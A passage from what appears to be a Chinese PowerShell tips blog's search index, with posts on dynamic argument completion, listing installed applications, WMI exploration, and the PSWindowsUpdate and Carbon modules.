$_ } | ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | Sort-Object -Unique | ForEach-Object { try { $file = Get-Item -Path $_ -ErrorAction Ignore [PSCustomObject]@{ Name = $file.Name Description = $file.VersionInfo.FileDescription Path = $file.FullName } } catch {} } | Sort-Object -Property Name -Unique$finalList | Out-GridView -PassThru 结果类似这样： 123456789PS&gt; $finalListName Description---- -----------7zfm.exe 7-Zip File Manageraccicons.exe Microsoft Office componentacrord32.exe Adobe Acrobat Reader DCagentservice.exe AgentService EXEaitstatic.exe Application Impact Telemetry...","link":"/2020/03/05/listing-installed-applications-part-2/"},{"title":"PowerShell 技能连载 - 动态参数完成（第 1 部分）","text":"在前面的技巧中，我们介绍了将参数完成符添加到参数的各种方法。一种方法是使用 [ArgumentCompleter] 属性，如下所示：如您所见，这仅是完善补全代码的问题：当文件名包含空格时，表达式放在引号内，否则不用。如果希望完成者仅返回文件并忽略文件夹，则将 -File 参数添加到 Get-ChildItem。 12345678910function Get-File { param( [Parameter(Mandatory)] [ArgumentCompleter({Get-ChildItem -Path $env:windir -Name})] [string] $FileName ) &quot;Chosen file name: $FileName&quot;} 本质上，运行此代码然后调用 Get-File 时，一旦使用 -FileName 参数，就可以按 TAB 或 CTRL + SPACE 自动列出 Windows 文件夹中所有文件的文件名。 PowerShell执行 [ArgumentCompleter] 中定义的脚本块以动态计算出自动完成的列表。 有一个反馈称，完成后，这些值需要检查特殊字符（例如空格），并在必要时用引号将它包裹起来。让我们听取这些反馈意见，看看如何改进自动完成代码： 1234567891011121314151617181920212223function Get-File { param( [Parameter(Mandatory)] [ArgumentCompleter({ Get-ChildItem -Path $env:windir -Name | ForEach-Object { if ($_ -like '* *') { &quot;'$_'&quot; } else { $_ } } })] [string] $FileName ) &quot;Chosen file name: $FileName&quot;} 如您所见，这完全是完善补全代码的问题：当文件名包含空格时，表达式需要放在引号内，否则就不需要。如果希望完成者仅返回文件并忽略文件夹，则将 -File 参数添加到 Get-ChildItem。","link":"/2020/03/09/dynamic-argument-completion-part-1/"},{"title":"PowerShell 技能连载 - 动态参数完成（第 2 部分）","text":"在前面的技巧中，我们研究了 [ArgumentCompleter] 以及此属性如何将聪明的代码添加到为参数提供自动完成值的参数。自动完成功能甚至可以做更多的事情：您可以根据实际情况生成 IntelliSense 菜单。 请看这段代码： 12345678910111213141516function Get-OU { param( [Parameter(Mandatory)] [ArgumentCompleter({ [Management.Automation.CompletionResult]::new(&quot;'OU=managers,DC=company,DC=local'&quot;, &quot;Management&quot;, &quot;ProviderItem&quot;, &quot;OU where the Management lives&quot;) [Management.Automation.CompletionResult]::new(&quot;'OU=subtest,OU=test,DC=company,DC=local'&quot;, &quot;Experimental&quot;, &quot;DynamicKeyword&quot;, &quot;Reserved&quot;) [Management.Automation.CompletionResult]::new(&quot;'OU=External,OU=IT,DC=company,DC=local'&quot;, &quot;Help Desk&quot;, &quot;ProviderItem&quot;, &quot;OU where the Helpdesk people reside&quot;) })] [string] $OU ) &quot;Chosen path: $OU&quot;} 完整代码基本上只创建三个新的CompletionResult对象。每个参数都有四个参数： 自动完成的文字 显示在 IntelliSense 菜单中的文字 IntelliSense 菜单的图标 IntelliSense 菜单的工具提示 您甚至可以控制 IntelliSense 菜单中显示的图标。这些是预定义的图标： 123456789101112131415PS&gt; [Enum]::GetNames([System.Management.Automation.CompletionResultType])TextHistoryCommandProviderItemProviderContainerPropertyMethodParameterNameParameterValueVariableNamespaceTypeKeywordDynamicKeyword 当您运行此代码然后调用 Get-OU 时，可以按 TAB 键完成 OU X500 路径，也可以按 CTRL + SPACE 打开 IntelliSense 菜单。在菜单内，您会看到所选的图标和友好的文本。选择项目后，将使用 X500 自动完成的文字。","link":"/2020/03/11/dynamic-argument-completion-part-2/"},{"title":"PowerShell 技能连载 - 动态参数完成（第 3 部分）","text":"根据我们过去讨论的技巧，让我们编写一个有用的最终代码，以列出所有可以启动的程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function Start-Software { param( [Parameter(Mandatory)] [ArgumentCompleter({# get registered applications from registry$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list = Get-ItemProperty -Path $key | Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore# add applications found by Get-Command[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands)# add descriptions and compose completionresult entries$list | # remove empty paths Where-Object { $_ } | # remove quotes and turn to lower case ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | # remove duplicate paths Sort-Object -Unique | ForEach-Object { # skip files that do not exist if ( (Test-Path -Path $_)) { # get file details $file = Get-Item -Path $_ # quote path if it has spaces $path = $_ if ($path -like '* *') { $path = &quot;'$path'&quot; } # make sure tooltip is not null $tooltip = [string]$file.VersionInfo.FileDescription if ([string]::IsNullOrEmpty($tooltip)) { $tooltip = $file.Name } # compose completion result [Management.Automation.CompletionResult]::new( # complete path $path, # show friendly text in IntelliSense menu ('{0} ({1})' -f $tooltip, $file.Name), # use file icon 'ProviderItem', # show file description $tooltip ) } } })] [string] $Path ) Start-Process -FilePath $Path} 当您运行上述代码然后调用 Start-Software 时，请按 CTRL + SPACE，以使用简称来查看可用应用程序的完整列表。选择一个后，将自动完成绝对路径。路径包含空格时将自动加上单引号。 请注意，您可以先输入一些字符，例如 exc，然后按 CTRL + SPACE。这将预过滤 IntelliSense 列表。 另请注意：根据计算机上安装的软件和驱动器的速度，此示例中的完成代码可能需要一些时间才能执行。如果 IntelliSense 菜单超时，请按 CTRL + SPACE 再试一次。","link":"/2020/03/13/dynamic-argument-completion-part-3/"},{"title":"PowerShell 技能连载 - 动态参数完成（第 4 部分）","text":"在上一个技能中，我们解释了如何使用 [ArgumentCompleter] 为参数添加功能强大的参数完成器。但是有一些限制： 当完成代码变得复杂时，您的代码将变得难以阅读 您不能将参数完成添加到现有命令。[ArgumentCompleter] 属性仅适用于您自己的函数。 但是，实际上，该属性只是将参数完成程序代码添加到 PowerShell 的两种方法之一。您也可以使用 Register-ArgumentCompleter 并将代码添加到现有命令中。 让我们首先看一下先前技巧中的示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function Start-Software { param( [Parameter(Mandatory)] [ArgumentCompleter({# get registered applications from registry$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list = Get-ItemProperty -Path $key | Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore# add applications found by Get-Command[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands)# add descriptions and compose completion result entries$list | # remove empty paths Where-Object { $_ } | # remove quotes and turn to lower case ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | # remove duplicate paths Sort-Object -Unique | ForEach-Object { # skip files that do not exist if ( (Test-Path -Path $_)) { # get file details $file = Get-Item -Path $_ # quote path if it has spaces $path = $_ if ($path -like '* *') { $path = &quot;'$path'&quot; } # make sure tooltip is not null $tooltip = [string]$file.VersionInfo.FileDescription if ([string]::IsNullOrEmpty($tooltip)) { $tooltip = $file.Name } # compose completion result [Management.Automation.CompletionResult]::new( # complete path $path, # show friendly text in IntelliSense menu ('{0} ({1})' -f $tooltip, $file.Name), # use file icon 'ProviderItem', # show file description $tooltip ) } } })] [string] $Path ) Start-Process -FilePath $Path} 函数 Start-Software 使用 [ArgumentCompleter] 属性定义了参数完成器，并且当使用 Start-Software 时，能获得 -Path 参数丰富的完成信息。 以下是一种替代方法，可以将完成程序代码单独发送到 PowerShell，而不使用属性。而是使用 Register-ArgumentCompleter 将完成程序代码绑定到任何命令的任何参数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# define a function without argument completerfunction Start-Software { param( [Parameter(Mandatory)] [string] $Path ) Start-Process -FilePath $Path}# define the code used for completing application paths$code = {# get registered applications from registry$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list = Get-ItemProperty -Path $key | Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore# add applications found by Get-Command[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands)# add descriptions and compose completionresult entries$list | # remove empty paths Where-Object { $_ } | # remove quotes and turn to lower case ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | # remove duplicate paths Sort-Object -Unique | ForEach-Object { # skip files that do not exist if ( (Test-Path -Path $_)) { # get file details $file = Get-Item -Path $_ # quote path if it has spaces $path = $_ if ($path -like '* *') { $path = &quot;'$path'&quot; } # make sure tooltip is not null $tooltip = [string]$file.VersionInfo.FileDescription if ([string]::IsNullOrEmpty($tooltip)) { $tooltip = $file.Name } # compose completion result [Management.Automation.CompletionResult]::new( # complete path $path, # show friendly text in IntelliSense menu ('{0} ({1})' -f $tooltip, $file.Name), # use file icon 'ProviderItem', # show file description $tooltip ) } }}# tie the completer code to all applicable parameters of own or foreign commandsRegister-ArgumentCompleter -CommandName Start-Software -ParameterName Path -ScriptBlock $codeRegister-ArgumentCompleter -CommandName Start-Process -ParameterName FilePath -ScriptBlock $code 现在，您自己的 Start-Software 函数的 -Path 参数和内置 cmdlet Start-Process 功能参数完成的 -FilePath 参数。完成代码可以重复利用。 注意：根据计算机上安装的软件和驱动器的速度，此示例中的完成代码可能需要一些时间才能执行。如果 IntelliSense 菜单超时，请按 CTRL + SPACE 再试一次。","link":"/2020/03/17/dynamic-argument-completion-part-4/"},{"title":"PowerShell 技能连载 - PowerShell 技能连载 - 动态参数完成（第 5 部分）","text":"在前面的技能中，我们研究了完成应用程序路径的复杂的完成代码。收集完成值可能需要一些时间，并且有可能使 IntelliSense 超时。对于不太可能更改的完成值，最好先计算一次，然后再使用缓存的值。 通过这种方式，安装自动完成器可能会占用一两秒时间，但是在那之后就可以享受快速的 IntelliSense： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# define a function without argument completerfunction Start-Software { param( [Parameter(Mandatory)] [string] $Path ) Start-Process -FilePath $Path}# define the code used for completing application paths$code = {}# calculate the completion values once, and reuse the values later# store results in a script-global variable$script:applicationCompleter = &amp; {# get registered applications from registry$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list = Get-ItemProperty -Path $key | Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore# add applications found by Get-Command[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands)# add descriptions and compose completionresult entries$list | # remove empty paths Where-Object { $_ } | # remove quotes and turn to lower case ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | # remove duplicate paths Sort-Object -Unique | ForEach-Object { # skip files that do not exist if ( (Test-Path -Path $_)) { # get file details $file = Get-Item -Path $_ # quote path if it has spaces $path = $_ if ($path -like '* *') { $path = &quot;'$path'&quot; } # make sure tooltip is not null $tooltip = [string]$file.VersionInfo.FileDescription if ([string]::IsNullOrEmpty($tooltip)) { $tooltip = $file.Name } # compose completion result [Management.Automation.CompletionResult]::new( # complete path $path, # show friendly text in IntelliSense menu ('{0} ({1})' -f $tooltip, $file.Name), # use file icon 'ProviderItem', # show file description $tooltip ) } }}# instead of complex code, simply return the cached results when needed$code = { $script:applicationCompleter }# tie the completer code to all applicable parameters of own or foreign commandsRegister-ArgumentCompleter -CommandName Start-Software -ParameterName Path -ScriptBlock $codeRegister-ArgumentCompleter -CommandName Start-Process -ParameterName FilePath -ScriptBlock $code 当您运行上面的代码然后使用 Start-Software 或 Start-Process 命令时，您将获得高度响应的 IntelliSense。与内置的完成功能相反，您需要手动按 CTRL + SPACE。","link":"/2020/03/19/dynamic-argument-completion-part-5/"},{"title":"The Largest PowerShell Community in China has 1885 Members Now!","text":"The largest PowerShell community “PowerShell Tech Interact” in China has 1885 members up to March 23, 2020! The goal of this community is to: Help new PowerShellers to get up to PowerShell language Help every PowerSheller overcome any PowerShell technical difficulties Share code and information to accelerate the learning process To contact with the community manager, please visit this MVP link. Join Us Now! (you may need to install QQ client first)","link":"/2020/03/23/largest-powershell-community-in-china-has-1885-members/"},{"title":"PowerShell 技能连载 - 使用 PSWindowsUpdate 管理更新","text":"在 PowerShell Gallery 中有许多有用的 PowerShell 模块。有一个能帮助您管理更新。要下载和安装它，请运行： 1PS&gt; Install-Module -Name PSWindowsUpdate -Scope CurrentUser -Force 它添加了一系列与 Windows Update 相关的新命令： 123456789101112131415161718192021222324252627282930PS&gt; Get-Command -Module PSWindowsUpdateCommandType Name Version Source----------- ---- ------- ------Alias Clear-WUJob 2.1.1.2 PSWindowsUpdateAlias Download-WindowsUpdate 2.1.1.2 PSWindowsUpdateAlias Get-WUInstall 2.1.1.2 PSWindowsUpdateAlias Get-WUList 2.1.1.2 PSWindowsUpdateAlias Hide-WindowsUpdate 2.1.1.2 PSWindowsUpdateAlias Install-WindowsUpdate 2.1.1.2 PSWindowsUpdateAlias Show-WindowsUpdate 2.1.1.2 PSWindowsUpdateAlias UnHide-WindowsUpdate 2.1.1.2 PSWindowsUpdateAlias Uninstall-WindowsUpdate 2.1.1.2 PSWindowsUpdateCmdlet Add-WUServiceManager 2.1.1.2 PSWindowsUpdateCmdlet Enable-WURemoting 2.1.1.2 PSWindowsUpdateCmdlet Get-WindowsUpdate 2.1.1.2 PSWindowsUpdateCmdlet Get-WUApiVersion 2.1.1.2 PSWindowsUpdateCmdlet Get-WUHistory 2.1.1.2 PSWindowsUpdateCmdlet Get-WUInstallerStatus 2.1.1.2 PSWindowsUpdateCmdlet Get-WUJob 2.1.1.2 PSWindowsUpdateCmdlet Get-WULastResults 2.1.1.2 PSWindowsUpdateCmdlet Get-WURebootStatus 2.1.1.2 PSWindowsUpdateCmdlet Get-WUServiceManager 2.1.1.2 PSWindowsUpdateCmdlet Get-WUSettings 2.1.1.2 PSWindowsUpdateCmdlet Invoke-WUJob 2.1.1.2 PSWindowsUpdateCmdlet Remove-WindowsUpdate 2.1.1.2 PSWindowsUpdateCmdlet Remove-WUServiceManager 2.1.1.2 PSWindowsUpdateCmdlet Set-PSWUSettings 2.1.1.2 PSWindowsUpdateCmdlet Set-WUSettings 2.1.1.2 PSWindowsUpdateCmdlet Update-WUModule 2.1.1.2 PSWindowsUpdate 大多数命令需要提升权限的 shell 才能正常工作，但每个人都可以获得基本信息。 123456789101112131415PS&gt; Get-WULastResultsWARNING: To perform some operations you must run an elevated Windows PowerShell console.ComputerName LastSearchSuccessDate LastInstallationSuccessDate------------ --------------------- ---------------------------DESKTOP-8DVNI43 22.01.2020 11:29:24 22.01.2020 11:29:52PS&gt; Get-WUApiVersionWARNING: To perform some operations you must run an elevated Windows PowerShell console.ComputerName PSWindowsUpdate PSWUModuleDll ApiVersion WuapiDllVersion------------ --------------- ------------- ---------- ---------------DESKTOP-8... 2.1.1.2 2.0.6995.28496 8.0 10.0.18362.387","link":"/2020/03/23/managing-updates-with-pswindowsupdate/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 探索 WMI","text":"Win32_LogicalDevice WMI 类代表计算机中可用的所有逻辑设备，通过查询此“超类”，您可以获取所有专用的单个类。这是找出 WMI 可以为您提供哪些信息以及 WMI 类的名称的简单方法： 123Get-CimInstance -ClassName CIM_LogicalDevice | Select-Object -Property Name, CreationClassName, DeviceID, SystemName | Out-GridView -Title 'Select one or more (hold CTRL)' -PassThru 在网格视图窗口中，选择一个或多个您感兴趣的实例（按住CTRL键选择多个实例），然后将选定的实例转储到控制台。请等待网格视图窗口填充完毕，然后再尝试选择某些内容。 在我的笔记本上，我选择了一个“音频设备”： Name CreationClassName DeviceID ---- ----------------- -------- Intel(R) Display-Audio Win32_SoundDevice INTELAUDIO\\FUNC_01&amp;VEN_8086&amp;DEV_280... 要查找有关它的更多信息，请使用 “CreationClassName“ 中的 WMI 类（即 Win32_SoundDevice）查询特定信息，运行以下命令： 1234567PS&gt; Get-CimInstance -ClassName Win32_SoundDeviceManufacturer Name Status StatusInfo------------ ---- ------ ----------Intel(R) Corporation Intel(R) Display-Audio OK 3DisplayLink DisplayLink USB Audio Adapter OK 3Realtek Realtek Audio OK 3 显然，我的机器中有三个声音设备。要查看所有详细信息，请将数据发送到 Select-Object： 12345678910111213141516171819202122232425262728293031323334353637383940PS&gt; Get-CimInstance -ClassName Win32_SoundDevice | Select-Object *ConfigManagerUserConfig : FalseName : Intel(R) Display-AudioStatus : OKStatusInfo : 3Caption : Intel(R) Display-AudioDescription : Intel(R) Display-AudioInstallDate :Availability :ConfigManagerErrorCode : 0CreationClassName : Win32_SoundDeviceDeviceID : INTELAUDIO\\FUNC_01&amp;VEN_8086&amp;DEV_280F&amp;SUBSYS_80860 101&amp;REV_1000\\5&amp;6790FB4&amp;0&amp;0201ErrorCleared :ErrorDescription :LastErrorCode :PNPDeviceID : INTELAUDIO\\FUNC_01&amp;VEN_8086&amp;DEV_280F&amp;SUBSYS_80860 101&amp;REV_1000\\5&amp;6790FB4&amp;0&amp;0201PowerManagementCapabilities :PowerManagementSupported : FalseSystemCreationClassName : Win32_ComputerSystemSystemName : DESKTOP-8DVNI43DMABufferSize :Manufacturer : Intel(R) CorporationMPU401Address :ProductName : Intel(R) Display-AudioPSComputerName :CimClass : root/cimv2:Win32_SoundDeviceCimInstanceProperties : {Caption, Description, InstallDate, Name...}CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProp ertiesConfigManagerUserConfig : FalseName : DisplayLink USB Audio AdapterStatus : OKStatusInfo : 3Caption : DisplayLink USB Audio Adapter... 并且，如果您想进一步了解此类（或其它类），请访问PowerShell WMI参考：http://powershell.one/wmi/root/cimv2/win32_sounddevice。只需将WMI类名替换为您要使用的类名即可。","link":"/2020/03/27/exploring-wmi-with-powershell/"},{"title":"PowerShell 技能连载 - 用 Carbon 添加新的 PowerShell 命令","text":"Carbon 是 PowerShell Gallery 中最受欢迎的免费 PowerShell 模块之一。它类似于瑞士军刀，具有多种辅助功能。要安装它，请运行以下命令： 1PS&gt; Install-Module -Name Carbon -Scope CurrentUser -Force 显然，该模块的所有者添加了有用的功能。这就是测试您的 PowerShell 当前是否处于提升状态所需的全部操作： 12PS&gt; Test-CAdminPrivilegeFalse 要加密或解密字符串，请使用以下命令： 123456789PS&gt; $secret = &quot;Secret Text&quot; | Protect-CString -ForUserPS&gt; $secretAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAf0R6lgTIWkqgPubPNRqOXwAAAAACAAAAAAAQZgAAAAEAACAAAADiVJHgXqE+4kLGfPISsvSg+cBG4m8Q0c5W1nqzl/pHDgAAAAAOgAAAAAIAACAAAACIF/xsRNBKG2cDnwCACA59JZaeOK/zedzmMrEMML0upxAAAABSmKyvYw4ul+jKW35NZdzmQAAAACE/4MFiRHJVhYOu65P/Vc7hVH5wuUfV0elFtwTfYdN+92h3aguob/RqfEANeUZfUotBOE4dxJDdr950rR4ss0I=PS&gt; $secret | Unprotect-CStringSecret Text 有很多参数可以通过其他方式进行加密，还有大量命令可以发现。显然，模块作者已将其命令名称前面添加了 “C”，也就是 “Carbon” 的意思，并且包括不带前缀的命令名称的别名。 命令的完整列表非常详尽： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409PS&gt; Get-Command -Module CarbonCommandType Name Version Source----------- ---- ------- ------Alias Add-GroupMember 2.9.2 CarbonAlias Add-GroupMembers 2.9.2 CarbonAlias Add-IisDefaultDocument 2.9.2 CarbonAlias Add-TrustedHost 2.9.2 CarbonAlias Add-TrustedHosts 2.9.2 CarbonAlias Assert-AdminPrivilege 2.9.2 CarbonAlias Assert-AdminPrivileges 2.9.2 CarbonAlias Assert-FirewallConfigurable 2.9.2 CarbonAlias Assert-Service 2.9.2 CarbonAlias Clear-DscLocalResourceCache 2.9.2 CarbonAlias Clear-MofAuthoringMetadata 2.9.2 CarbonAlias Clear-TrustedHost 2.9.2 CarbonAlias Clear-TrustedHosts 2.9.2 CarbonAlias Complete-Job 2.9.2 CarbonAlias Complete-Jobs 2.9.2 CarbonAlias Compress-Item 2.9.2 CarbonAlias ConvertFrom-Base64 2.9.2 CarbonAlias Convert-SecureStringToString 2.9.2 CarbonAlias ConvertTo-Base64 2.9.2 CarbonAlias ConvertTo-ContainerInheritanceFlags 2.9.2 CarbonAlias ConvertTo-FullPath 2.9.2 CarbonAlias ConvertTo-InheritanceFlag 2.9.2 CarbonAlias ConvertTo-InheritanceFlags 2.9.2 CarbonAlias ConvertTo-PropagationFlag 2.9.2 CarbonAlias ConvertTo-PropagationFlags 2.9.2 CarbonAlias ConvertTo-SecurityIdentifier 2.9.2 CarbonAlias Convert-XmlFile 2.9.2 CarbonAlias Copy-DscResource 2.9.2 CarbonAlias Disable-AclInheritance 2.9.2 CarbonAlias Disable-FirewallStatefulFtp 2.9.2 CarbonAlias Disable-IEEnhancedSecurityConfiguration 2.9.2 CarbonAlias Disable-IisSecurityAuthentication 2.9.2 CarbonAlias Disable-NtfsCompression 2.9.2 CarbonAlias Enable-AclInheritance 2.9.2 CarbonAlias Enable-FirewallStatefulFtp 2.9.2 CarbonAlias Enable-IEActivationPermission 2.9.2 CarbonAlias Enable-IEActivationPermissions 2.9.2 CarbonAlias Enable-IisDirectoryBrowsing 2.9.2 CarbonAlias Enable-IisSecurityAuthentication 2.9.2 CarbonAlias Enable-IisSsl 2.9.2 CarbonAlias Enable-NtfsCompression 2.9.2 CarbonAlias Expand-Item 2.9.2 CarbonAlias Find-ADUser 2.9.2 CarbonAlias Format-ADSearchFilterValue 2.9.2 CarbonAlias Format-ADSpecialCharacters 2.9.2 CarbonAlias Get-ADDomainController 2.9.2 CarbonAlias Get-Certificate 2.9.2 CarbonAlias Get-CertificateStore 2.9.2 CarbonAlias Get-ComPermission 2.9.2 CarbonAlias Get-ComPermissions 2.9.2 CarbonAlias Get-ComSecurityDescriptor 2.9.2 CarbonAlias Get-DscError 2.9.2 CarbonAlias Get-DscWinEvent 2.9.2 CarbonAlias Get-FileShare 2.9.2 CarbonAlias Get-FileSharePermission 2.9.2 CarbonAlias Get-FirewallRule 2.9.2 CarbonAlias Get-FirewallRules 2.9.2 CarbonAlias Get-Group 2.9.2 CarbonAlias Get-HttpUrlAcl 2.9.2 CarbonAlias Get-IisApplication 2.9.2 CarbonAlias Get-IisAppPool 2.9.2 CarbonAlias Get-IisConfigurationSection 2.9.2 CarbonAlias Get-IisHttpHeader 2.9.2 CarbonAlias Get-IisHttpRedirect 2.9.2 CarbonAlias Get-IisMimeMap 2.9.2 CarbonAlias Get-IisSecurityAuthentication 2.9.2 CarbonAlias Get-IisVersion 2.9.2 CarbonAlias Get-IisWebsite 2.9.2 CarbonAlias Get-IPAddress 2.9.2 CarbonAlias Get-Msi 2.9.2 CarbonAlias Get-MsmqMessageQueue 2.9.2 CarbonAlias Get-MsmqMessageQueuePath 2.9.2 CarbonAlias Get-PathCanonicalCase 2.9.2 CarbonAlias Get-PathProvider 2.9.2 CarbonAlias Get-PathToHostsFile 2.9.2 CarbonAlias Get-PerformanceCounter 2.9.2 CarbonAlias Get-PerformanceCounters 2.9.2 CarbonAlias Get-Permission 2.9.2 CarbonAlias Get-Permissions 2.9.2 CarbonAlias Get-PowerShellModuleInstallPath 2.9.2 CarbonAlias Get-PowershellPath 2.9.2 CarbonAlias Get-Privilege 2.9.2 CarbonAlias Get-Privileges 2.9.2 CarbonAlias Get-ProgramInstallInfo 2.9.2 CarbonAlias Get-RegistryKeyValue 2.9.2 CarbonAlias Get-ScheduledTask 2.9.2 CarbonAlias Get-ServiceAcl 2.9.2 CarbonAlias Get-ServiceConfiguration 2.9.2 CarbonAlias Get-ServicePermission 2.9.2 CarbonAlias Get-ServicePermissions 2.9.2 CarbonAlias Get-ServiceSecurityDescriptor 2.9.2 CarbonAlias Get-SslCertificateBinding 2.9.2 CarbonAlias Get-SslCertificateBindings 2.9.2 CarbonAlias Get-TrustedHost 2.9.2 CarbonAlias Get-TrustedHosts 2.9.2 CarbonAlias Get-User 2.9.2 CarbonAlias Get-WmiLocalUserAccount 2.9.2 CarbonAlias Grant-ComPermission 2.9.2 CarbonAlias Grant-ComPermissions 2.9.2 CarbonAlias Grant-HttpUrlPermission 2.9.2 CarbonAlias Grant-MsmqMessageQueuePermission 2.9.2 CarbonAlias Grant-MsmqMessageQueuePermissions 2.9.2 CarbonAlias Grant-Permission 2.9.2 CarbonAlias Grant-Permissions 2.9.2 CarbonAlias Grant-Privilege 2.9.2 CarbonAlias Grant-ServiceControlPermission 2.9.2 CarbonAlias Grant-ServicePermission 2.9.2 CarbonAlias Initialize-Lcm 2.9.2 CarbonAlias Install-Certificate 2.9.2 CarbonAlias Install-Directory 2.9.2 CarbonAlias Install-FileShare 2.9.2 CarbonAlias Install-Group 2.9.2 CarbonAlias Install-IisApplication 2.9.2 CarbonAlias Install-IisAppPool 2.9.2 CarbonAlias Install-IisVirtualDirectory 2.9.2 CarbonAlias Install-IisWebsite 2.9.2 CarbonAlias Install-Junction 2.9.2 CarbonAlias Install-Msi 2.9.2 CarbonAlias Install-Msmq 2.9.2 CarbonAlias Install-MsmqMessageQueue 2.9.2 CarbonAlias Install-PerformanceCounter 2.9.2 CarbonAlias Install-RegistryKey 2.9.2 CarbonAlias Install-ScheduledTask 2.9.2 CarbonAlias Install-Service 2.9.2 CarbonAlias Install-SmbShare 2.9.2 CarbonAlias Install-User 2.9.2 CarbonAlias Invoke-AppCmd 2.9.2 CarbonAlias Invoke-PowerShell 2.9.2 CarbonAlias Invoke-WindowsInstaller 2.9.2 CarbonAlias Join-IisVirtualPath 2.9.2 CarbonAlias Lock-IisConfigurationSection 2.9.2 CarbonAlias New-Credential 2.9.2 CarbonAlias New-Junction 2.9.2 CarbonAlias New-RsaKeyPair 2.9.2 CarbonAlias New-TempDir 2.9.2 CarbonAlias New-TempDirectory 2.9.2 CarbonAlias Protect-Acl 2.9.2 CarbonAlias Protect-String 2.9.2 CarbonAlias Read-File 2.9.2 CarbonAlias Remove-Certificate 2.9.2 CarbonAlias Remove-DotNetAppSetting 2.9.2 CarbonAlias Remove-EnvironmentVariable 2.9.2 CarbonAlias Remove-GroupMember 2.9.2 CarbonAlias Remove-HostsEntry 2.9.2 CarbonAlias Remove-IisMimeMap 2.9.2 CarbonAlias Remove-IniEntry 2.9.2 CarbonAlias Remove-Junction 2.9.2 CarbonAlias Remove-MsmqMessageQueue 2.9.2 CarbonAlias Remove-RegistryKeyValue 2.9.2 CarbonAlias Remove-Service 2.9.2 CarbonAlias Remove-SslCertificateBinding 2.9.2 CarbonAlias Remove-User 2.9.2 CarbonAlias Reset-HostsFile 2.9.2 CarbonAlias Reset-MsmqQueueManagerID 2.9.2 CarbonAlias Resolve-FullPath 2.9.2 CarbonAlias Resolve-Identity 2.9.2 CarbonAlias Resolve-IdentityName 2.9.2 CarbonAlias Resolve-NetPath 2.9.2 CarbonAlias Resolve-PathCase 2.9.2 CarbonAlias Resolve-RelativePath 2.9.2 CarbonAlias Restart-RemoteService 2.9.2 CarbonAlias Revoke-ComPermission 2.9.2 CarbonAlias Revoke-ComPermissions 2.9.2 CarbonAlias Revoke-HttpUrlPermission 2.9.2 CarbonAlias Revoke-Permission 2.9.2 CarbonAlias Revoke-Privilege 2.9.2 CarbonAlias Revoke-ServicePermission 2.9.2 CarbonAlias Set-DotNetAppSetting 2.9.2 CarbonAlias Set-DotNetConnectionString 2.9.2 CarbonAlias Set-EnvironmentVariable 2.9.2 CarbonAlias Set-HostsEntry 2.9.2 CarbonAlias Set-IisHttpHeader 2.9.2 CarbonAlias Set-IisHttpRedirect 2.9.2 CarbonAlias Set-IisMimeMap 2.9.2 CarbonAlias Set-IisWebsiteID 2.9.2 CarbonAlias Set-IisWebsiteSslCertificate 2.9.2 CarbonAlias Set-IisWindowsAuthentication 2.9.2 CarbonAlias Set-IniEntry 2.9.2 CarbonAlias Set-RegistryKeyValue 2.9.2 CarbonAlias Set-ServiceAcl 2.9.2 CarbonAlias Set-SslCertificateBinding 2.9.2 CarbonAlias Set-TrustedHost 2.9.2 CarbonAlias Set-TrustedHosts 2.9.2 CarbonAlias Split-Ini 2.9.2 CarbonAlias Start-DscPullConfiguration 2.9.2 CarbonAlias Test-AdminPrivilege 2.9.2 CarbonAlias Test-AdminPrivileges 2.9.2 CarbonAlias Test-DotNet 2.9.2 CarbonAlias 